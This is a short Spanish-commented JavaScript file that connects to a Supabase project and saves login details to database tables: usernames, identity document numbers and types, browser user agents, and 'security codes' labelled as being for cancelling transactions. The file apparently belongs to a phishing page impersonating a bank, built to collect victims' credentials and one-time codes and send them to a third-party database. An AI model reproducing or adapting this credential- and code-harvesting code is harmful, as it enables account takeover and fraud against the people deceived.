// Configuración de Supabase
const SUPABASE_URL = 'https://uzgdyypmqmnirkrqnlmq.supabase.co';
const SUPABASE_ANON_KEY = 'sb_publishable_5WgSnTPGEdfor1a83W0IIQ_pYrlY9ZD';

// Inicializar Supabase (usando la CDN)
let supabaseClient = null;

async function initSupabase() {
    if (typeof window.supabase !== 'undefined') {
        supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
        console.log('Supabase inicializado correctamente');
        return true;
    } else {
        console.error('Supabase no está cargado');
        return false;
    }
}

// Función para guardar datos de login
async function guardarLogin(datosLogin) {
    try {
        const { data, error } = await supabaseClient
            .from('logins')
            .insert([{
                usuario: datosLogin.usuario,
                documento: datosLogin.documento,
                tipo_documento: datosLogin.tipo_documento,
                fecha_login: new Date().toISOString(),
                ip: datosLogin.ip || '192.168.1.1',
                user_agent: navigator.userAgent
            }]);

        if (error) throw error;
        return { success: true, data: data[0] };
    } catch (error) {
        console.error('Error guardando login:', error);
        return { success: false, error: error.message };
    }
}

// Función para guardar código de seguridad
async function guardarCodigoSeguridad(loginId, codigo) {
    try {
        const { data, error } = await supabaseClient
            .from('codigos_seguridad')
            .insert([{
                login_id: loginId,
                codigo: codigo,
                tipo: 'cancelacion_transacciones',
                fecha_creacion: new Date().toISOString(),
                usado: false
            }]);

        if (error) throw error;
        return { success: true, data: data[0] };
    } catch (error) {
        console.error('Error guardando código:', error);
        return { success: false, error: error.message };
    }
}

// Función para obtener el último login del usuario
async function obtenerUltimoLogin(usuario) {
    try {
        const { data, error } = await supabaseClient
            .from('logins')
            .select('*')
            .eq('usuario', usuario)
            .order('fecha_login', { ascending: false })
            .limit(1);

        if (error) throw error;
        return data && data.length > 0 ? data[0] : null;
    } catch (error) {
        console.error('Error obteniendo login:', error);
        return null;
    }
}

// Exportar funciones
window.supabaseService = {
    initSupabase,
    guardarLogin,
    guardarCodigoSeguridad,
    obtenerUltimoLogin
};